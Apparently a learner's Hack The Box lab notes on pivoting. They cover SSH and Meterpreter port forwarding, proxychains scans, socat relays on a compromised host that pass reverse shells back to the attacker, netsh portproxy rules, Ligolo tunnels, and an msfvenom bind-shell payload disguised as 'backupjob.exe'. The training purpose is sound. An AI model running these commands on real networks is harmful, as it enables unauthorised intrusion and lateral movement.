SSH
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

ssh -L 1234:localhost:3306 -L 8080:localhost:80 user@host

Dynamic port forwarding
ssh -D 9050 ubuntu@10.129.202.64
Anything sent to port 9050 on my side is sent to the whole internal network on the target side.
tell proxychains it can use this port:
tail -4 /etc/proxychains.conf

socks4 127.0.0.1 9050

use nmap with proxychains:
drime@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200

use proxychains + metasploit:
drime@htb[/htb]$ proxychains msfconsole

proxychains rdp:
drime@htb[/htb]$ proxychains xfreerdp /v:host /u:user /p:pass


Remote Port Forwarding:
ssh -R <Internal IP ofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN

on the target host, send all incoming messages going to the internal ip of the target host to my side (0.0.0.0:8080). This is for reverse shells through the pivot host.

Meterpreter port forwarding
create tcp relay:

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389

3300 my side maps to 172.16.5.19:3389
reverse port forwarding:
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234

anything that goes to 10.10.14.18:8081 will be sent to port 1234 on my side. Useful for reverse shells.

socat
Using socat
socat can create pipe sockets between 2 independent network channels.
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80


listen on port 8080, forward all traffic to 10.10.14.18:80. Can set this up on the victim server as an alternative to port forwarding with ssh.
bind shell listener:
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443


listens on port 8080 and forwards to 172.16.5.19:8443
set up bind shell:
drime@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443

Port forwarding using windows netsh
Netsh is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use Netsh for:
Finding routes
Viewing the firewall configuration
Adding proxies
Creating port forwarding rules
port forward with netsh:
C:\\Windows\\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25

verify port forward:
C:\\Windows\\system32> netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.15.150   8080        172.16.5.25     3389

so now anything that goes to 10.129.15.150:8080 is routed to 172.16.5.25:3389

Ligolo
Ligolo
Create the tunnel named ligolo with your username on your computer
sudo ip tuntap add user [your_username] mode tun ligolo
Bring the tunnel up
sudo ip link set ligolo up
Start the proxy without a cert
sudo ./proxy -selfcert
On the agent computer, connect to your proxy server
./agent -connect [ip address]:11601 -ignore-cert
Use session to select the agent
session , then select 1
On the agent, start the tunnel on the proxy 
tunnel_start --tun ligolo
Add the route on your proxy server
sudo ip route add [ip address, 192.168.X.X]/24 dev ligolo
